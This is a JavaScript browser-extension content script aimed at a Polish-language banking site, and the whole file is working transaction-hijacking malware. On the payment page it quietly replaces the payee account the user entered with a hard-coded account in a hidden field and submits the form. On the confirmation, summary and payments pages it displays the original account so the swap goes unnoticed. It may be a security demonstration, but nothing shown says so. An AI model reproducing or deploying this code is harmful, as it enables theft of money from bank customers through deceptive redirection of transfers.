var currentPath = window.location.pathname;

console.log('welcome extension');

localStorage.setItem("accounts", []);

if(currentPath == '/payment/'){
    var button = document.getElementById("submit_button");
    button.onclick = change_account;
}

else if(currentPath == '/confirm/'){
    var account_field = document.getElementById("account");
    account_field.innerHTML = "Numer konta: " + localStorage.account;

    var button = document.getElementById("submit_button");
    button.onclick = push_account;
}

else if(currentPath == '/summary/'){
    var account_field = document.getElementById("account");
    account_field.innerHTML = "Numer konta: " + localStorage.account;
}

else if(currentPath == '/payments/'){
    var accounts = JSON.parse(localStorage.getItem("accounts"));

    if(accounts){
        let i = 0;
        var r_accounts = document.getElementsByClassName("account-number");
        for(i = 0; i < accounts.length;i++){
            r_accounts[i].innerHTML = "Konto odbiorcy: " + accounts[i];
        }
    }
}

function change_account(){
    var form = window.parent.document.forms["payment"];
    var prev_input = document.getElementById("id_account");
    localStorage.account = prev_input.value;

    var new_input = document.createElement("input");
    new_input.setAttribute("type", "hidden");
    new_input.setAttribute("name","account");
    new_input.setAttribute("value",12345678);
    document.getElementById("div_id_account").appendChild(new_input);

    prev_input.name="";
    form.submit();
}

function push_account(){
    var accounts = JSON.parse(localStorage.getItem("accounts"));
    console.log(accounts);

    accounts.push(localStorage.account)
    localStorage.setItem("accounts", JSON.stringify(accounts));
}
